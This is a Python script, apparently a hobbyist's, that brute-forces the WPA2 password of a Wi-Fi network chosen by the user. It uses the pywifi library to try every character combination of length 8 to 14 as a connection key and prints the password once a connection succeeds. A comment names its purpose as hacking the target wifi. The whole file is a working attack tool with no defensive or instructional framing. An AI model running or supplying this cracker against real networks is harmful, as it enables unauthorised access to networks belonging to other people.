# Importing General Libraries
import argparse
import sys , os , os.path , platform
import re
import time
a=str(input("WIFI name : "))
print(a)
# Importing pywifi libraryMobinNet7452-2
import pywifi
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile
import itertools # efficient looping
import string    # string functions
import time
from typing import ForwardRef      # time checking
x=1
y=0
file_name = "C:\\Users\\arman\\OneDrive\\Desktop\\python\\wifi\\pas.txt"
# Change According to needs -->
# cient_ssid == name of the wifi which you want to hack
# path to already created brute force password file

ssid=client_ssid = a
path_to_file = r"C:\\Users\\arman\\OneDrive\\Desktop\\python\\wifi\\pas.txt"

########
start_range = 8
end_range = 15
########

# Setting the color combinations
RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"
try:
    # Interface information 
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]  # for wifi we use index - 0

    ifaces.scan() #check the card
    results = ifaces.scan_results() #Obtain the results of the previous triggerred scan. A Profile list will be returned.

    wifi = pywifi.PyWiFi() # A Profile is the settings of the AP we want to connect to
    iface = wifi.interfaces()[0]
except:
    print("[-] Error system")
type = False





#/////////////////////////////////////////////////////////////////////////////




def password_wordlist(start_range=2,end_range=3,file_name="C:\\Users\\arman\\OneDrive\\Desktop\\python\\wifi\\pas.txt"):
    # string with all characters needed or have potential for being password
    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + '@' + '#' + '$' + '.'
    # attempts counter
    attempts = 0
    # open file 
    #f = open(file_name,'a')
    x=1
    y=0
    #print("def pass c ")
    for password_length in range(start_range, end_range):
        #print("foe pas c 1")
        for guess in itertools.product(chars,repeat=password_length): 
            #print("foe pas c 2")
            if x==1:
                #print("if pas c ")
                attempts += 1
                guess = ''.join(guess)
                #f.write(guess) # write in file
                #f.write("\n")
                #print(guess, attempts)
                password=guess
                x=0
            
                
            
            #print(password)
        




            profile = Profile()  # create profile instance
            profile.ssid = ssid  #name of client
            profile.auth = const.AUTH_ALG_OPEN # auth algo
            profile.akm.append(const.AKM_TYPE_WPA2PSK) # key management
            profile.cipher = const.CIPHER_TYPE_CCMP #type of cipher

            profile.key = password # use generated password
            iface.remove_all_network_profiles() # remove all the profiles which are previously connected to device
            tmp_profile = iface.add_network_profile(profile) # add new profile 
            time.sleep(0.1) # if script not working change time to 1 !!!!!!
            iface.connect(tmp_profile) # trying to Connect
            time.sleep(0.35) # 1s
            if ifaces.status() == const.IFACE_CONNECTED: # checker
                time.sleep(1)
                print(BOLD, GREEN,'[*] Crack success!',RESET)
                print(BOLD, GREEN,'[*] password is ' + password, RESET)
                time.sleep(1)
                exit()
            
            else:
                #print(password)
                print(RED, '[] Crack Failed using '.format(password))
                x=1
               

password_wordlist(start_range,end_range,file_name)
#/////////////////////////////////////////////////////////////




#kian and arman XD
